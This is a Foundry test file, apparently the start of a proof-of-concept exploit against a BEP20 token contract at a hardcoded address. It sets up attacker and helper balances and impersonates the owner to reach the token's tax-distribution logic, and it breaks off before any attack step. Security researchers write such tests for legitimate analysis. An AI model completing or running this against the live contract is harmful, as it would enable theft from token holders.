contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x16bE19fB70F902EcF39b54aD988eE427cB1b6848;
    address attacker = address(this);

    // Helper addresses
    address helper1 = address(0x100);
    address helper2 = address(0x200);
    address helper3 = address(0x300);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Label addresses for debugging
        vm.label(helper1, "Helper1");
        vm.label(helper2, "Helper2");
        vm.label(helper3, "Helper3");

        // Get initial tokens for attacker
        uint256 initialAmount = 1000 * 10**18;
        deal(TARGET, attacker, initialAmount);

        // Get tokens for helpers
        deal(TARGET, helper1, initialAmount);
        deal(TARGET, helper2, initialAmount);
        deal(TARGET, helper3, initialAmount);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get owner address
        address ownerAddress = Ownable(TARGET).owner();
        console.log("Owner address:", ownerAddress);

        // Record initial balance
        uint256 initialBalance = IBEP20(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // Create helper addresses
        address helper1 = address(0x100);
        address helper2 = address(0x200);

        // Impersonate owner to transfer tokens to helpers (this will add them to _accounts array)
        vm.startPrank(ownerAddress);
        IBEP20(TARGET).transfer(helper1, 1000 * 10**18);
        IBEP20(TARGET).transfer(helper2, 1000 * 10**18);
        IBEP20(TARGET).transfer(attacker, 1000 * 10**18);  // Ensure attacker is in _accounts array
        vm.stopPrank();

        // Now make transfers from owner to trigger tax distribution
        // Since owner is _accounts[0], transfers from owner to pancakePair are allowed
        // But we need transfers between regular addresses to trigger tax distribution to other _accounts

        // First, let helpers transfer small amounts to each other (within their allowed sell limits)
